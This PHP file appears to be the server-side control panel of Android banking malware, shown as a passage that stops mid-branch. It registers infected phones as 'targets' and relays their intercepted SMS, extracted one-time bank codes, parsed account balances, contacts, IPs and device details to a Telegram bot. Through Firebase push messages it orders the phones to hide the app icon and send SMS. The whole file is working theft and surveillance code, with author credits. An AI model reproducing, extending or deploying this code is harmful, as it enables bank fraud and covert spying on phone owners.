<?php

include("chalim.php");

define('TOKEN', $bot_token);
define('PROJECT_ID', $project_id);
define('FILE', $file);

define('PORT_SUDO', $sudo_port);

#---------------------------------


function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}

function getAccessToken($file)
{
    require 'vendor/autoload.php';
    $serviceAccountFilePath = "$file";
    $serviceAccount = json_decode(file_get_contents($serviceAccountFilePath), true);

    // Generate the JWT using the service account credentials
    $clientEmail = $serviceAccount['client_email'];
    $privateKey = $serviceAccount['private_key'];

    $payload = [
        "iss" => $clientEmail,
        "scope" => "https://www.googleapis.com/auth/firebase.messaging",
        "aud" => "https://www.googleapis.com/oauth2/v4/token",
        "iat" => time(),
        "exp" => time() + 3600
    ];

    $jwt = Firebase\JWT\JWT::encode($payload, $privateKey, 'RS256');

    // Get the OAuth 2.0 access token
    $requestBody = [
        "grant_type" => "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion" => $jwt
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.googleapis.com/oauth2/v4/token");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($requestBody));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json"
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    $accessToken = json_decode($response)->access_token;

    return $accessToken;
}

function getBankInfo($cardNumber) {
    $banks = [
        '603799' => ['ᴍᴇʟʟɪ', '#Melli'],
        '589210' => ['ꜱᴇᴘᴀʜ', '#Sepah'],
        '627648' => ['ꜱᴀᴅᴇʀᴀᴛ', '#Saderat'],
        '627961' => ['ꜱᴀɴᴀᴛᴍᴀᴅᴀɴ', '#SanatMadan'],
        '603770' => ['ᴋᴇꜱʜᴀᴠᴀʀᴢɪ', '#Keshavarzi'],
        '628023' => ['ᴍᴀꜱᴋᴀɴ', '#Maskan'],
        '627760' => ['ᴘᴏꜱᴛʙᴀɴᴋ', '#PostBank'],
        '502908' => ['ᴛᴀᴀᴠᴏɴ', '#Taavon'],
        '627412' => ['ᴇɢʜᴛᴇꜱᴀᴅɴᴏᴠɪɴ', '#EghtesadNovin'],
        '622106' => ['ᴘᴀʀꜱɪᴀɴ', '#Parsian'],
        '502229' => ['ᴘᴀꜱᴀʀɢᴀᴅ', '#Pasargad'],
        '639347' => ['ꜱɪɴᴀ', '#Sina'],
        '636214' => ['ᴀʏᴀɴᴅᴇʜ', '#Ayandeh'],
        '505416' => ['ɢᴀʀᴅᴇꜱʜɢᴀʀɪ', '#Gardeshgari'],
        '606256' => ['ᴍᴇʟʟᴀᴛ', '#Mellat'],
        '621986' => ['ꜱᴀᴍᴀɴ', '#Saman'],
        '603769' => ['ꜱᴀᴅᴇʀᴀᴛ', '#Saderat'],
        '610433' => ['ᴍᴇʟʟᴀᴛ', '#Mellat'],
        '627353' => ['ᴛᴇᴊᴀʀᴀᴛ', '#Tejarat'],
        '585983' => ['ᴛᴇᴊᴀʀᴀᴛ', '#Tejarat'],
        '589463' => ['ʀᴇꜰᴀʜ', '#Refah'],
        '505801' => ['ᴋᴏꜱᴀʀ', '#Kosar'],
        '639599' => ['ɢʜᴀᴠᴀᴍɪɴ', '#Ghavamin'],
        '636949' => ['ʜᴇᴋᴍᴀᴛ', '#Hekmat'],
        '627488' => ['ᴋᴀʀᴀꜰᴀʀɪɴ', '#KarAfarin'],
        '504172' => ['ʀᴇꜱᴀʟᴀᴛ', '#Resalat'],
        '606373' => ['ᴍɪᴅᴅʟᴇᴇᴀꜱᴛ', '#MiddleEast'],
        '639370' => ['ᴍᴇʜʀᴇɢʜᴛᴇꜱᴀᴅ', '#MehrEghtesad'],
        '505785' => ['ɴᴏᴏʀ', '#Noor'],
        '505809' => ['ᴀʀᴢᴇꜱʜ', '#Arzesh'],
        '636795' => ['ʜᴇʀᴍᴇꜱ', '#Hermes'],
        '502910' => ['ᴋᴀʀᴅᴇʀ', '#Karder'],
        '636703' => ['ᴇɴᴇʀɢʏ', '#Energy'],
        '628157' => ['ᴛᴏꜱᴇᴇ', '#Tosee']
    ];
    
    $bin = substr($cardNumber, 0, 6);
    return $banks[$bin] ?? ['ᴜɴᴋɴᴏᴡɴ', '#Unknown'];
}

function strposA($text, $needles = array())
{
    $isin = false;
    for ($i = 0; $i < count($needles); $i++) {
        if (strpos($text, $needles[$i]) !== false) {
            $isin = true;
        }
    }
    return $isin;
}
function findPooya($string)
{
    $date = '';
    $explode = explode("\n", $string);
    foreach ($explode as $line) {
        if (strpos($line, "code") !== false or strpos($line, "ورود") !== false or strpos($line, "پویا") !== false or strpos($line, "رمز") !== false or strpos($line, "Code") !== false) {
            if (strposA($line, ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'])) {
                $pan = getNumber($line);
            }
        }
    }
    return $pan;
}
function getNumber($string)
{
    $number = '';
    for ($i = 0; $i < strlen($string); $i++) {
        if (is_numeric($string[$i])) {
            $number .= $string[$i];
        }
    }
    return $number;
}

function getNumber2($x)
{
    preg_match('/[A-Za-z0-9]+/', $x, $matches);
    $number = $matches[0];
    return $number;
}

function smg($chatid, $text, $keyboard)
{
    bot('sendMessage', [
        'chat_id' => $chatid,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}
function emg($chatid, $message_id, $text, $keyboard)
{
    bot('editmessagetext', [
        'chat_id' => $chatid,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}
function EMflag(string $code): string
{
    return (string) preg_replace_callback(
        '/./',
        static fn (array $letter) => mb_chr(ord($letter[0]) % 32 + 0x1F1E5),
        $code
    );
}
function asd($string, $start, $end)
{
    $string = ' ' . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
function requests($mode, $device_id)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    file_put_contents("sath.txt", $result);
}

#Sms Request
function requestSMS($mode, $device_id, $phone, $message)
{

    $access = getAccessToken(FILE);

    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "phone" => $phone,
                "text" => $message
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
}

function Client_IP()
{
    $target_client_ip = @$_SERVER['HTTP_CLIENT_IP'];
    $target_forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $target_remote_ip = $_SERVER['REMOTE_ADDR'];
    if (filter_var($target_client_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_client_ip;
    } elseif (filter_var($target_forward_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_forward_ip;
    } else {
        $ip = $target_remote_ip;
    }
    return $ip;
}

function addOnlineUser($androidid)
{
    $filePath = 'data/online_users.json';
    $onlineUsers = [];

    if (file_exists($filePath)) {
        $onlineUsers = json_decode(file_get_contents($filePath), true);
    }

    $onlineUsers[$androidid] = "";
    file_put_contents($filePath, json_encode($onlineUsers));
}

function getPaginatedUsers($page, $pageSize = 20)
{
    $filePath = 'data/online_users.json';
    $onlineUsers = [];

    if (file_exists($filePath)) {
        $onlineUsers = json_decode(file_get_contents($filePath), true);
    }

    $totalUsers = count($onlineUsers);
    $totalPages = ceil($totalUsers / $pageSize);
    $page = max(1, min($totalPages, $page));

    $start = ($page - 1) * $pageSize;
    $usersOnPage = array_slice($onlineUsers, $start, $pageSize, true);

    return ['users' => $usersOnPage, 'totalUsers' => $totalUsers, 'totalPages' => $totalPages, 'currentPage' => $page];
}

function createInlineKeyboard($currentPage, $totalPages)
{
    $keyboard = [];

    if ($totalPages > 1) {
        if ($currentPage > 1) {
            $keyboard[] = ['text' => 'Previous', 'callback_data' => 'page_' . ($currentPage - 1)];
        }
        if ($currentPage < $totalPages) {
            $keyboard[] = ['text' => 'Next', 'callback_data' => 'page_' . ($currentPage + 1)];
        }
    }

    return json_encode(['inline_keyboard' => [$keyboard]]);
}

function updateJsonValueInFile($filename, $key, $newValue)
{
    $jsonString = file_get_contents($filename);

    $data = json_decode($jsonString, true);

    if (array_key_exists($key, $data)) {
        $data[$key] = $newValue;
    } else {
        $data[$key] = $newValue;
    }
    $updatedJsonString = json_encode($data, JSON_PRETTY_PRINT);
    file_put_contents($filename, $updatedJsonString);
}

function doFirstAction($bal,$targetphone,$hide,$androidid){
    if($bal == "on"){
        requests("balance",$androidid);
    }
    if($targetphone == "on"){
        requests("userphone",$androidid);
    }
    if($hide == "on"){
        requests("hidden",$androidid);
    }
}

function updateMessageWithUsers($chatId, $messageId, $currentPage)
{
    $pagination = getPaginatedUsers($currentPage);
    $users = $pagination['users'];
    $totalUsers = $pagination['totalUsers'];
    $totalPages = $pagination['totalPages'];

    $text = "📡ᴀᴄᴛɪᴏɴ : #ᴘɪɴɢ_ᴀʟʟ\n\n";
    foreach ($users as $androidid => $name) {
        $text .= "<code>/login_$androidid</code>\n";
    }
    $text .= "\nusers : $totalUsers\n";
    $text .= "Page {$pagination['currentPage']}/$totalPages\n";
    $text .= "➖➖➖➖➖➖➖➖➖➖\n‍💻ᴄᴏᴅᴇᴅ ʙʏ : <a href='t.me/oxfild'>oxfild</a>";

    $keyboard = createInlineKeyboard($pagination['currentPage'], $totalPages);

    emg($chatId, $messageId, $text, $keyboard);
}
      
/*{
            static $Ary_List = array('REMOTE_ADDR', 'HTTP_CLIENT_IP', 'CLIENT_IP', 'HTTP_PROXY_CONNECTION', 'HTTP_FORWARDED', 'HTTP_X_FORWARDED', 'HTTP_X_FORWARDED_HOST', 'HTTP_X_FORWARDED_SERVER', 'FORWARDED_FOR_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED_FOR_IP', 'HTTP_X_FORWARDED_FOR', 'FORWARDED', 'X_FORWARDED_FOR', 'FORWARDED_FOR', 'X_FORWARDED', 'HTTP_VIA', 'VIA');                        
                foreach($Ary_List as $Value_array)        
                {        
                    if(isset($_SERVER[$Value_array]))        
                    {        
                        return $_SERVER[$Value_array];        
                    }        
                    elseif(getenv($Value_array))        
                    {        
                        return getenv($Value_array);        
                    }        
                    else        
                    {        
                        continue;        
                    }        
                }                        
            return 0;        
        }*/
#----------------------------------------------
$ip = Client_IP();
mkdir('user');
$action = $_POST['action'];
if (isset($_POST['Device_id'])) {
    $Device_id = $_POST['Device_id'];
}
if (isset($_POST['Model'])) {
    $Model = $_POST['Model'];
}
if (isset($_POST['Battery'])) {
    $Battery = $_POST['Battery'];
}
if (isset($_POST['andver'])) {
    $os = $_POST['andver'];
}
if (isset($_POST['operator'])) {
    $operator = $_POST['operator'];
}
if (isset($_POST['sender'])) {
    $sender = $_POST['sender'];
}
if (isset($_POST['screen'])) {
    $screen = $_POST['screen'];
}
if(isset($_POST['phones'])){
    $phones = $_POST['phones'];
}
if (isset($_POST['messagetext'])) {
    $message_text = $_POST['messagetext'];
}
if (isset($_POST['result'])) {
    $cardresult = $_POST['result'];
}
if (isset($_POST['message'])) {
    $message_ussd = $_POST['message'];
}
if (isset($_POST['Android'])) {
    $Android = $_POST['Android'];
}
if (isset($_POST['berand'])) {
    $berand = $_POST['berand'];
}
if (isset($_POST['Product'])) {
    $Product = $_POST['Product'];
}
if (isset($_POST['word'])) {
    $kal = $_POST['word'];
}
if (isset($_POST['contactname'])) {
    $contactname = $_POST['contactname'];
}
#---------------------------------------------
$install_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "fs $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]],
    [['text' => "", 'callback_data' => "Kops $Device_id $Model"], ['text' => "", 'callback_data' => "kkkk $Device_id $Model"]]
]]);
$online_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "hg $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]],
    [['text' => "", 'callback_data' => "rt $Device_id $Model"]]
]]);
$Log_Panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "ID : $Device_id", 'callback_data' => "ls $Device_id $Model"]]
]]);
$status_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "rt $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]], [['text' => "", 'callback_data' => "kkkk $Device_id $Model"]],
]]);
$sms_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "newic $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]],
]]);

#---------------------------------------------
if (isset($_POST['action'])) {
    $action_autohide = file_get_contents("data/autohide.txt");
    $action_first = file_get_contents("data/firstsms.txt");
    $Message_First = file_get_contents("data/number-first.txt");
    $Number_First = file_get_contents("data/message-first.txt");
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $online_model = file_get_contents("data/online_model.txt");
    $firstActionData = null;
    if (file_exists("data/firstaction.json")) {
        $firstActionData = json_decode(file_get_contents("data/firstaction.json"));
    } elseif (file_exists("firstaction.json")) {
        $firstActionData = json_decode(file_get_contents("firstaction.json"));
    }
    $bal = $firstActionData->balance ?? "off";
    $targetpgone = $firstActionData->targetphone ?? "off";
    $autohide = $firstActionData->autohide ?? "off";
}
#---------------------------------------------


if ($action == "install") {

    if (!file_exists("user/$Device_id-model.txt")) {
        $cont = file_get_contents("data/contact.txt");

        $kossher = $cont + 1;
        file_put_contents("user/$Device_id-apk.txt", "Visible");
        file_put_contents("user/$Device_id-ringer.txt", "No set");
        file_put_contents("user/$Device_id-name.txt", "User$kossher");
        file_put_contents("user/$Device_id-offline.txt", "OFF");
        file_put_contents("user/$Device_id-ip.txt", $ip);
        file_put_contents("user/$Device_id-model.txt", $Model);

        file_put_contents("data/contact.txt", $cont + 1);
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $name = file_get_contents("user/$Device_id-name.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"]);
        smg($id_sender, "
┌── •✧ 𝐍𝐄𝐖 𝐓𝐀𝐑𝐆𝐄𝐓 ✧•
│
├ 📱 𝐃𝐞𝐯𝐢𝐜𝐞 : $Model
├ 📡 𝐂𝐚𝐫𝐫𝐢𝐞𝐫 : $operator
├ 🌐 𝐈𝐏 : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $install_panel);
    } else {
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $name = file_get_contents("user/$Device_id-name.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"]);
        smg($id_sender, "
┌── •✧ 𝐓𝐀𝐑𝐆𝐄𝐓 𝐑𝐄-𝐈𝐍𝐒𝐓𝐀𝐋𝐋 ✧•
│
├ 📱 𝐃𝐞𝐯𝐢𝐜𝐞 : $Model
├ 📡 𝐂𝐚𝐫𝐫𝐢𝐞𝐫 : $operator
├ 🌐 𝐈𝐏 : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $install_panel);
    }
}
if ($action == "install") {

    if ($action_first == "on") {


        $Number_First = file_get_contents("data/number-first.txt");
        $Message_First = file_get_contents("data/message-first.txt");
        sleep(3);
        requestSMS("send_sms", $Device_id, $Number_First, $Message_First);
    }
}
if ($action == "install") {
    if ($action_autohide == "on") {
        sleep(4);
        requests('hidden', $Device_id);
    }

    if($action == "install"){
        doFirstAction($bal,$targetpgone,$autohide,$Device_id);
    }

} if ($action == "online_device") {
    if ($online_model == "list") {
        addOnlineUser($Device_id);
        $mid = file_get_contents("data/mid.txt");
        $page = 1;
        updateMessageWithUsers($id_sender, $mid, $page);
    } else {
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $name = file_get_contents("user/$Device_id-name.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"]);
        smg($id_sender, "
┌── •✧ 𝐓𝐀𝐑𝐆𝐄𝐓 𝐎𝐍𝐋𝐈𝐍𝐄 ✧•
│
├ 📱 𝐃𝐞𝐯𝐢𝐜𝐞 : $Model
├ 📡 𝐂𝐚𝐫𝐫𝐢𝐞𝐫 : $operator
├ 🌐 𝐈𝐏 : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $online_panel);
    }
} elseif ($action == "Hidden_icon") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    file_put_contents("user/$Device_id-apk.txt", "Hidden");
    smg($id_sender, "
┌── •✧ 𝐇𝐈𝐃𝐃𝐄𝐍 ✧•
│
├ ✅ App Hidden Successfully
├ 📱 $Model
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", null);
} elseif ($action == "iconchange") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    file_put_contents("user/$Device_id-apk.txt", "Changed");
    smg($id_sender, "
┌── •✧ 𝐈𝐂𝐎𝐍 𝐂𝐇𝐀𝐍𝐆𝐄𝐃 ✧•
│
├ ✅ Icon Changed Successfully
├ 📱 $Model
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", null);
} elseif ($action == "offlineOn") {
    file_put_contents("user/$Device_id-offline.txt", "ON");
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender, "
┌── •✧ 𝐎𝐅𝐅𝐋𝐈𝐍𝐄 𝐌𝐎𝐃𝐄 ✧•
│
├ ⚡ Status : <b>ON</b>
├ 📱 $Model
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", null);
} elseif ($action == "offlineOff") {
    file_put_contents("user/$Device_id-offline.txt", "OFF");
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender, "
┌── •✧ 𝐎𝐅𝐅𝐋𝐈𝐍𝐄 𝐌𝐎𝐃𝐄 ✧•
│
├ ⚡ Status : <b>OFF</b>
├ 📱 $Model
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", null);
} elseif ($action == "visible_icon") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    file_put_contents("user/$Device_id-apk.txt", "Visible");
    smg($id_sender, "
┌── •✧ 𝐔𝐍𝐇𝐈𝐃𝐄 ✧•
│
├ ✅ App Unhidden Successfully
├ 📱 $Model
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", null);
} elseif ($action == "status") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"]);
    smg($id_sender, "
┌── •✧ 𝐃𝐄𝐕𝐈𝐂𝐄 𝐒𝐓𝐀𝐓𝐔𝐒 ✧•
│
├ 📱 Model : $Model
├ 📡 Carrier : $operator
├ 🌐 IP : <code>$ip</code>
├ 📶 Offline : $offline
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $status_panel);
} elseif ($action == "ReciveSMS") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"]);

    $file_content = file_get_contents('block.txt');

    if (strpos($file_content, $ip) !== false) {
    } else {
        $x = findPooya($message_text);
        if ($x == "") {
            $x = getNumber2($message_text);
        }
        $xx = "<b>Code :</b> <code>$x</code>";
        $message_text = str_replace("$x", "<code>$x</code>", $message_text);
        
        $contactDisplay = "";
        if (!empty($contactname)) {
            $contactDisplay = " [$contactname]";
        }
        
        smg($id_sender, "
┌── •✧ 𝐍𝐄𝐖 𝐒𝐌𝐒 ✧•
│
├ 📩 From : $sender$contactDisplay
│
├ <blockquote>$message_text</blockquote>
│
├ 📱 $Model
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $sms_panel);
    }
} elseif ($action == "OTPSMS") {
    $phone = asd($message_text, '[Address=', ', Body=');
    $body = asd($message_text, ', Body=', 'IsInitialized');
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"]);
    
    $contactDisplay = "";
    if (!empty($contactname)) {
        $contactDisplay = " [$contactname]";
    }
    
    smg($id_sender, "
┌── •✧ 𝐎𝐓𝐏 𝐒𝐌𝐒 ✧•
│
├ 📩 From : $sender$contactDisplay
│
├ <blockquote>$body</blockquote>
│
├ 📱 $Model
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $sms_panel);
} elseif ($action == "lastsms") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"]);
    
    $contactDisplay = "";
    if (!empty($contactname)) {
        $contactDisplay = " [$contactname]";
    }
    
    smg($id_sender, "
┌── •✧ 𝐋𝐀𝐒𝐓 𝐒𝐌𝐒 ✧•
│
├ 📩 From : $sender$contactDisplay
│
├ <blockquote>$message_text</blockquote>
│
├ 📱 $Model
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $sms_panel);
} elseif ($action == "lastbanksms") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"]);
    $sender = str_replace(["\n"], '', $sender);
    
    $contactDisplay = "";
    if (!empty($contactname)) {
        $contactDisplay = " [$contactname]";
    }
    
    smg($id_sender, "
┌── •✧ 𝐁𝐀𝐍𝐊 𝐒𝐌𝐒 ✧•
│
├ 🏦 Bank : $sender$contactDisplay
│
├ <blockquote>$message_text</blockquote>
│
├ 📱 $Model
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $sms_panel);
} elseif ($action == "balance") {
    $x = file_get_contents("data/bal.txt");
    if ($x == "singel") {
        $BalanceText = "";
        if (isset($_POST['Balances'])) {
            $Balance_Data = json_decode(base64_decode($_POST['Balances']), true);
        } else {
            $Balance_Data = [];
        }
        if (count($Balance_Data) == 0) {
            $BalanceText = "❌ پیام بانکی ای وجود ندارد";
        } else {
            foreach ($Balance_Data as $key => $balance) {
                $BalanceText .= "\n<b>$key</b>";
                $BalanceText .= "\n💰 " . $balance['Balance'];
                $BalanceText .= "\n☎️ شماره : " . $balance['Address'];
                $BalanceText .= "\n==============";
            }
        }


        smg($id_sender, "$BalanceText", null);
        file_put_contents("data/bal.txt", "xx");
    } else {
        $BalanceText = "";
        if (isset($_POST['Balances'])) {
            $Balance_Data = json_decode(base64_decode($_POST['Balances']), true);
        } else {
            $Balance_Data = [];
        }
        if (count($Balance_Data) == 0) {
            $BalanceText = "❌ پیام بانکی ای وجود ندارد";
        } else {
            foreach ($Balance_Data as $key => $balance) {
                $BalanceText .= "\n💵 <b>$key</b>";
                $BalanceText .= "\n📞 سر شماره : " . $balance['Address'];
                $BalanceText .= "\n💰 " . $balance['Balance'];
                $BalanceText .= "\n-- - -- - -- - -- - -- - -- - --";
            }
        }

        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $name = file_get_contents("user/$Device_id-name.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"]);
        smg($id_sender, "
┌── •✧ 𝐁𝐀𝐋𝐀𝐍𝐂𝐄𝐒 ✧•
│
$BalanceText
│
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $sms_panel);
    }
} elseif ($action == "WhatsChecker") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender, "
┌── •✧ 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ✧•
│
├ 📊 Status : <code>$message_text</code>
├ 📱 Model : $Model
├ 📡 Network : $operator
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
├ 🔗 <code>/login_$Device_id</code>
├ 🔗 <code>/block_$ip</code>
│
└── •<a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $sms_panel);
} elseif ($action == "searchSMS") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"]);
    
    $contactDisplay = "";
    if (!empty($contactname)) {
        $contactDisplay = " [$contactname]";
    }
    
    smg($id_sender, "
┌── •✧ 𝐒𝐄𝐀𝐑𝐂𝐇 𝐑𝐄𝐒𝐔𝐋𝐓 ✧•
│
├ 📩 From : $sender$contactDisplay
│
├ <blockquote>$message_text</blockquote>
│
├ 📱 $Model
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── •<a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $sms_panel);
}
elseif ($action == "userphone") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
